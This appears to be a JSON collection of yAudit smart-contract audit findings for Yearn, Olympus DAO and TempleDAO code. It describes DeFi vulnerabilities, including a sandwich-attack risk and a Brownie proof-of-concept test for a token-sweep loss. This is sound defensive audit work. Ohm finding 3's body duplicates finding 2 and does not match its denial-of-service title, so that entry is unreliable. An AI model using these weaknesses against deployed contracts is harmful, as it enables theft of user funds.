"https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "withdrawSome() contains an if statement of if (_amountNeeded > 0). The two instances where this internal function is called is on line 210 and line 298. In both instances, the _amountNeeded function argument is greater than zero, so the if statement can be removed because the code in the if statement will always be used.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "13. Unnecessary internal function call", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "_lpToLd() calls liquidityPool.amountLPtoLD(). _lpToLd() is only used once, in withdrawSome(). liquidityPool.amountLPtoLD() is already called directly in valueOfLPTokens(), so _lpToLd() may as well be removed and the single instance of it replaced with a direct call to the external function. The same approach could be taken with _stakeLP() which calls the external lpStaker.deposit() function.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "14. balanceOfReward() can be external", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "If a function is only called externally and does not need to be called internally, it can be declared external for gas savings. Apply this to balanceOfReward().", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "15. Faster return from function", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "If the input param _amountNeeded is 0 there is no need to do any calculations.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "16. Minor fix not applied to mainnet strats", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "Changes in recent commits, such as 36ddf75 and a1aaf31, contain changes that do not appear in the mainnet strategy contract code. The code on mainnet is using an older version of the contract code. Although the differences do not appear to impact the logic of the strategy, it is normally a good idea to update code on mainnet when improvements are made.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "17. Incorrect comment(s)", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "There is a comment Amount of tokens that all strategies have borrowed in the strategy on the line of code for vault.strategies(address(this)).totalDebt. This comment was copied from the Vault contract's comment about the Vault's totalDebt state variable, and does not properly describe the code on this line because this line uses the totalDebt value in the StrategyParams struct for a specific strategy.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "18. Interfaces are not cleanly defined", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "Several unexpected situations are found in the interface files: The standard IERC20 interface file does not have a token() function, but the IERC20Metadata.sol file has a token() function. This is probably a mistake that should be fixed because token() should only be called on pool addresses and is defined in IPool. Instead, consider adding name() to this interface like the OpenZeppelin IERC20Metadata.sol file. The ILPStaking interface contains pendingStargate() and pendingEmissionToken() functions. These functions are not found in the same Stargate contract. The interface combines functions from LPStaking and LPStakingTime to avoid creating a new interface file. decimals() can be removed from IWETH.sol because it is not used in the strategy.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "19. tradeFactory.disable() never called", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "setTradeFactory() is designed to migrate to a new ySwaps trade factories. _removeTradeFactoryPermissions() removes the approval of the old tradeFactory before a new one is approved. _removeTradeFactoryPermissions() does not call tradeFactory.disable(), but it might be preferable to do so and follow the design of how the TradeFactory contract was written.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "20. Could use Stargate RouterETH for WETH/SGETH conversion", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The list of Stargate contracts deployed on mainnet shows two router contracts, one named Router and one named RouterETH. Strangely, the RouterEth contract does not exist in the main branch of Stargate's github repository. The code is verified on Etherscan and shows that RouterEth.sol integrates with the SGETH contract to support ETH deposits. The addLiquidityETH() function in RouterEth could serve the same purpose as the custom _convertWETHtoSGETH() found in the strategy. Whether it is better to use existing code outside of the strategy or create an implementation in the strategy is up to the developers to determine, and the choice may come down to gas cost.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "21. Documentation improvements possible", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The only difference between harvestTrigger() in BaseStrategy and Strategy is that the Strategy implementation adds a check for the minReportDelay value and uses > maxReportDelay instead of >= maxReportDelay. Most of the logic in the custom implementation could be replaced by a super.harvestTrigger() as suggested in the BaseStrategy NatSpec.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "22. No USDT pool on Optimism", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "A comparison was done of the Stargate contracts on the different chains where Yearn Finance operates (mainnet, Arbitrum, and Optimism). The deployed contracts are listed in the Stargate docs. The findings from this comparison were: Mainnet and Arbitrum contracts of Stargate are identical Optimism has no USDT pool There are two differences between Arbitrum and Optimism a) The USDC Pool.sol on Optimism uses a flattened import structure for some odd reason, but otherwise the logic is the same in the pool contract and all imported files b) The LPStaking contract on Arbitrum and mainnet is renamed to LPStakingTime on Optimism and these contract have many differences: i) The LPStakingTime contract on Optimism uses an \"eToken\" with emissions for rewards (not STG). The eToken is OP, the Optimism token. It is a standard OpenZeppelin ERC20 token rather than the custom StarGate token that is not a simple OpenZeppelin ERC20. ii) The LPStakingTime contract on Optimism uses block.timestamp instead of block.number because this is one of the known differences in Optimism. iii) Some functions in LPStakingTime are external while the same function in LPStaking is public.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "23. == true unnecessary for boolean evaluation", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "Booleans evaluated with true in the form require(wantIsWETH == true) can be simplified to require(wantIsWETH). The longer form may be easier to understand depending on the reader.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "24. aeWETH on Arbitrum is not an exact WETH9 clone", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "aeWETH on Arbitrum inherits WETH9 but is not an exact clone of the Ethereum mainnet WETH9 contract like WETH on Optimism. Extra attention may be needed here when deploying the strategy on Arbitrum for WETH.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "25. Rename variable", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The name _liquidAssets is a bit misleading because it represents only a part of liquid assets, i.e. liquidated assets.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "26. Use vault decimals", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "Decimals data is stored in the vault. No need to add additional imports.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "27. Use explicit uint type", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "Style change.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "28. Unused interface IPriceFeed", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "Interface is defined but not used in the code.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "29. Missing protected token", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "Sweeping LP token, strategy will report a loss. Only unstaken LP tokens can be sweeped. PoC: def test_sweep_lp(gov, vault, strategy, token, user, amount, token_lp, chain, RELATIVE_APPROX): # 1- Deposit to the vault token.approve(vault.address, amount, {\"from\": user}) vault.deposit(amount, {\"from\": user}) assert token.balanceOf(vault.address) == amount strategy.setDoHealthCheck(False, {\"from\": gov}) # 2- Harvest chain.sleep(1) strategy.harvest({\"from\": gov}) assert pytest.approx(strategy.estimatedTotalAssets(), rel=RELATIVE_APPROX) == amount # 3- Unstake LP tokens strategy.unstakeLP(amount, {\"from\": gov}) # 4- Sweep LP tokens unprotected_tokens = [token_lp] for token in unprotected_tokens: strategy.sweep(token, {\"from\": gov}) # Strategy lost all of it's money assert pytest.approx(strategy.estimatedTotalAssets(), rel=RELATIVE_APPROX) == 0 # Strategy still has debt assert vault.strategies(strategy).dict()[\"totalDebt\"] == amount # 5- Report loss chain.sleep(1) tx = strategy.harvest({\"from\": gov}) assert tx.events[\"StrategyReported\"][\"loss\"] == amount assert vault.strategies(strategy).dict()[\"totalLoss\"] == amount", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "30. Change function emergencyUnstakeLP() visibility", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "Current visibility is set to public but can be changed to external because strategy uses internal function implementation _emergencyUnstakeLP().", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "31. Reward token can be swept by governance", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "BaseStrategy contract has a virtual function to define which tokens cannot be swept by the governance. The Strategy contract does not honor this by not setting the reward token as protected.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "32. Reverts are missing reason string", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "There are five instances of this issue (1, 2, 3, 4, 5).", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "33. Returned address from create is not explicitly checked to be non-zero", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "In assembly, create does not revert when a deployment fails. It instead returns zero address. This is currently not an issue because there is an implicit check due to the call made to the newStrategy. However, not having an explicit check might cause this to be overlooked in future refactorings of the code.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "34. Missing Zero-Address Check", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The lpStaker assignment in initializeThis() is missing a zero address check. Granted, there is an implicit revert when a function is called on zero address; however, debugging an unnamed revert could end up consuming valuable time. As such, a zero address check would expedite Strategy deployment and operation by quickly reverting during the construction of the contract if the LPStaker address passed is a zero address.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "35. Cache storage variables", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "Accessing a state variable for the first time in a function takes 2100 gas (Gcoldsload), and then 100 gas (Gwarmaccess) for each additional time. So, it is best to cache (store in a stack/ memory) the storage variable if there are multiple reads for it within the same function.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "36. Use calldata for unchanging external function args", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "We can use calldata instead of memory for array, struct or mapping type arguments in external functions, which are not mutated in the function. This will save gas since the argument would not need to be saved into memory first.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "37. Use uint256 for bool values", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "On the EVM, changing a state variable from 0 to non-zero uses Gsset and incurs 20,000 gas. In case of bools, every time a bool is changed from false ( value of 0), to true, Gsset cost of 20,000 is incurred.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "38. Unnecessary declaration for Abi Coder pragma", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "Abi Coder v2 is enabled by default since Solidity 0.8.0, hence it is not necessary to explicitly enable it.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "39. Constant is not named in capital letters", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The official Solidity style guide recommends using all capital letters for contants. However, the constant max does not adhere to this guideline.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "40. Anyone can send ETH to the contract via the receive() function", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "The receive() function allows the Strategy contract to receive ETH from the WETH contract when the want token is WETH. However, anyone can send ETH to the contract via the receive() function as the address that sends the ETH isn't checked.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "41. Possible precision loss via the _ldToLp function", "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md", "body": "In the _ldToLp function the value returned is calculated by first dividing and then multiplying. This could lead to precision loss when liquidityPool.convertRate() != 1. If the convertRate() changes, the _ldToLp function will return lower value than expected.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. staking.unstake() should set rebasing bool to true", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "The steps that the YieldStreamer functions take to withdraw yield to stream tokens occur in this order Calculate yield in gOHM Unwrap gOHM to sOHM Unstake sOHM to OHM Convert OHM to stream token The problem is in step 3. The rebasing bool is set to false, which will cause the staking contract to take gOHM from msg.sender instead of taking sOHM as the YieldStreamer contract requires. The logic for the rebasing boolean in the staking contract is if (_rebasing) { sOHM.safeTransferFrom(msg.sender, address(this), _amount); amount_ = amount_.add(bounty); } else { gOHM.burn(msg.sender, _amount); // amount was given in gOHM terms amount_ = gOHM.balanceFrom(amount_).add(bounty); // convert amount to OHM terms & add bounty } In order to convert sOHM to OHM in the staking.unstake() function, which is required in step 3 of the steps outlined above, the rebasing parameter must be set to true. Otherwise gOHM will be converted instead. https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/Staking.sol#L181 Currently the rebasing boolean value is set to false in two locations https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L246 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L322", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "2. Sandwich attack risk in YieldStreamer.sol", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "This code is how the swap is performed in YieldStreamer.sol in two locations: https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L248-L255 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L324-L331 uint256[] memory calculatedAmounts = sushiRouter.getAmountsOut(totalOhmToSwap, sushiRouterPath); uint256[] memory amounts = sushiRouter.swapExactTokensForTokens( totalOhmToSwap, (calculatedAmounts[1] * (1000000 - maxSwapSlippagePercent)) / 1000000, sushiRouterPath, msg.sender, block.timestamp ); The amountOutMin value is the output of getAmountsOut(totalOhmToSwap, sushiRouterPath) minus some slippage percent maxSwapSlippagePercent. Examining the code of the swapExactTokensForTokens() function, we can see how amountOutMin is used. There is a check to confirm the result of the exchange is greater than the amountOutMin https://github.com/sushiswap/sushiswap/blob/56cedd0e06a6cf665083b3a662f9f77b80303ebe/contracts/uniswapv2/UniswapV2Router02.sol#L233 amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path); require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'); But because the swapExactTokensForTokens() function is using the exact same getAmountsOut() function that was used in YieldStreamer.sol to calculate amountOutMin and is calculated in the same transaction, the result is that the two getAmountsOut() output values will always be equal. So the amountOutMin set in YieldStreamer.sol serves no purpose because it can never yield a result where the amountOutMin value reverts the swap, because amountOutMin is getAmountsOut() minus some slippage, which will always be less than or equal to getAmountsOut(). The current calculation to provide an amountOutMin value is a waste of gas. Even in a scenario where a private relay is used, miners cannot guarantee that a block will not become an uncle block. If the block is uncled, the mempool data becomes public and an uncle bandit attack is possible.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "3. Denial of service in upkeep \"for\" loop in YieldStreamer.sol", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "This code is how the swap is performed in YieldStreamer.sol in two locations: https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L248-L255 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L324-L331 uint256[] memory calculatedAmounts = sushiRouter.getAmountsOut(totalOhmToSwap, sushiRouterPath); uint256[] memory amounts = sushiRouter.swapExactTokensForTokens( totalOhmToSwap, (calculatedAmounts[1] * (1000000 - maxSwapSlippagePercent)) / 1000000, sushiRouterPath, msg.sender, block.timestamp ); The amountOutMin value is the output of getAmountsOut(totalOhmToSwap, sushiRouterPath) minus some slippage percent maxSwapSlippagePercent. Examining the code of the swapExactTokensForTokens() function, we can see how amountOutMin is used. There is a check to confirm the result of the exchange is greater than the amountOutMin https://github.com/sushiswap/sushiswap/blob/56cedd0e06a6cf665083b3a662f9f77b80303ebe/contracts/uniswapv2/UniswapV2Router02.sol#L233 amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path); require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'); But because the swapExactTokensForTokens() function is using the exact same getAmountsOut() function that was used in YieldStreamer.sol to calculate amountOutMin and is calculated in the same transaction, the result is that the two getAmountsOut() output values will always be equal. So the amountOutMin set in YieldStreamer.sol serves no purpose because it can never yield a result where the amountOutMin value reverts the swap, because amountOutMin is getAmountsOut() minus some slippage, which will always be less than or equal to getAmountsOut(). The current calculation to provide an amountOutMin value is a waste of gas. Even in a scenario where a private relay is used, miners cannot guarantee that a block will not become an uncle block. If the block is uncled, the mempool data becomes public and an uncle bandit attack is possible.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "4. donatedTo and depositsTo only return the first of N possible donation or deposit mappings", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "https://github.com/OlympusDAO/olympus-contracts/blob/main/contracts/peripheral/YieldDirector.sol#L195 https://github.com/OlympusDAO/olympus-contracts/blob/main/contracts/peripheral/YieldDirector.sol#L256", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "5. _redeemAll() does not delete recipientLookup", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "In the _redeem() function, receiptIds.pop(); and delete recipientLookup[depositId_] are called https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L429-L455 But in the similar _redeemAll() function, there is no delete recipientLookup[depositId_]; call. https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L460-L488", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "6. Declare function external for gas savings", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L315", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "7. Use == for gas savings", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "<= is used instead of == in three modifiers https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L71-L81 >= can be simplified to < by flipping the if/else clauses in two locations https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L415 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L163 An example of flipping the if/else clauses is shown. Here is the original code: if (amount_ >= _toAgnostic(depositInfo[depositId_].principalAmount)) { amountWithdrawn = _withdrawAllPrincipal(depositId_, msg.sender); } else { _withdrawPrincipal(depositId_, amount_, msg.sender); amountWithdrawn = amount_; } And here is the modified code with a minor gas savings. This specific gas savings may be negated if the _withdrawAllPrincipal clause is used most of the time: if (amount_ < _toAgnostic(depositInfo[depositId_].principalAmount)) { _withdrawPrincipal(depositId_, amount_, msg.sender); amountWithdrawn = amount_; } else { amountWithdrawn = _withdrawAllPrincipal(depositId_, msg.sender); }", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "8. Simplify math for gas savings", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/types/YieldSplitter.sol#L129", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "9. Use msg.sender for gas savings", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L404", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "10. Remove functions to save gas on deployment", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "balanceTo and balanceFrom in gOHM.sol convert between sOHM and gOHM using the current index exchange rate https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/governance/gOHM.sol#L111-L127 The YieldSplitter.sol functions _fromAgnostic and _toAgnostic duplicate this functionality https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/types/YieldSplitter.sol#L170-L186", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "11. Gas savings using unchecked", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/types/YieldSplitter.sol#L167", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "12. Gas savings with memory variable", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "The _closeDeposit() function in YieldSplitter.sol uses the value \"depositInfo[id_].depositor\" twice https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/types/YieldSplitter.sol#L144 The _redeemAll() in YieldDirector.sol function uses the value \"depositInfo[receiptIds[index - 1]].depositor\" twice https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L460", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "13. redeemAll repeatedly computes index - 1", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "13. redeemAll repeatedly computes index - 1", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "14. Miscellaneous Improvement Ideas", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "Examples of overlap between YieldDirector.sol and YieldStreamer.sol include: YieldDirector.sol has modifiers isInvalidDeposit, isInvalidUpdate, and isInvalidWithdrawal, but YieldStreamer.sol only checks the boolean value depositDisabled, withdrawDisabled, or upkeepDisabled. YieldStreamer.sol may benefit from the same modifiers used in YieldDirector.sol. Functions like desposit() and addToDeposit() perform almost identical actions but have different names for input parameters and different natspec comments. These could be standardized better across the two contracts. Examples of magic numbers that should be converted to constant variables are found in several places: https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L436 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L445 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L251 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L318 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L327", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "15. updateUserMinDaiThreshold assumes Dai is used as the streamToken", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "https://github.com/OlympusDAO/olympus-contracts/blob/main/contracts/peripheral/YieldStreamer.sol#L280", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "16. Missing calls in scripts/deployAll.js", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md", "body": "Start ganache and run npx hardhat run --network localhost scripts/deployAll.js . Observe the error message stating revert Timelock is disabled, use enable. To fix, add the line await olympusTreasury.initialize(); before the calls to olympusTreasury.queueTimelock() and observe the above hardhat work.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. Incorrect transfer of funds on token exit", "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-TempleDAO-Origami-Recheck.md", "body": "Calling exitToToken(ExitQuoteData calldata quoteData, address recipient) user can define address recipient to receive the funds but this address is ignored and all funds are sent to the message sender instead.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "2. Avoid double checking", "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-TempleDAO-Origami-Recheck.md", "body": "At L222 there is a check for condition reserveTokenAmount != 0, which already checked at L213.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "3. Incorrect comment", "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-TempleDAO-Origami-Recheck.md", "body": "File MintableToken has a comment with an incorrect function accessibility.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "4. Governable and GovernableUpgradeable should abstract common code into a common contract", "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-TempleDAO-Origami-Recheck.md", "body": "4. Governable and GovernableUpgradeable should abstract common code into a common contract", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}]